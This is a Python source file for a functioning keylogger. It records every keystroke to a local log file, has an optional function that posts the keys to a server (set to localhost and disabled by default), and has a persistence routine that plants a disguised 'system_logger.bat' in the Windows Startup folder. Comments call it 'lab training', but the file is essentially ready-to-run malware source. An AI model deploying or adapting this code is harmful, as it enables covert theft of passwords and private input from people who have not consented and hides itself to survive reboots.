from pynput import keyboard
import threading
import requests
import os
import datetime

# ✅ Config
LOG_FILE = "keystrokes.log"
SEND_TO_SERVER = False  # Set to True if simulating exfil to Django or flask endpoint
SERVER_URL = "http://localhost:8000/log_keystroke/"  # Your test server (Django, Flask)

# 🔐 Safe storage of logs locally
def write_log(key):
    with open(LOG_FILE, "a") as f:
        f.write(f"{datetime.datetime.now()}: {key}\n")

# 🌐 Optional remote logging
def send_log(key):
    try:
        requests.post(SERVER_URL, data={"page": "offline", "keys": key})
    except:
        pass  # Avoid crash if offline

# 🧠 Key listener logic
def on_press(key):
    try:
        k = key.char if hasattr(key, 'char') else str(key)
    except:
        k = str(key)

    write_log(k)
    if SEND_TO_SERVER:
        send_log(k)

# ⏱️ Start background key listener
def start_logger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# 🔄 Optional persistence setup
def setup_persistence():
    # Example: Windows startup folder (use responsibly in lab)
    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    script_path = os.path.abspath(__file__)
    shortcut = os.path.join(startup_path, 'system_logger.bat')
    with open(shortcut, "w") as f:
        f.write(f'@echo off\npython "{script_path}"\n')
    print("[+] Persistence set up (lab use only)")

# ✅ Start it
if __name__ == "__main__":
    print("[*] Starting keylogger for lab training...")
    background = threading.Thread(target=start_logger)
    background.start()

    # Uncomment for testing persistence
    # setup_persistence()
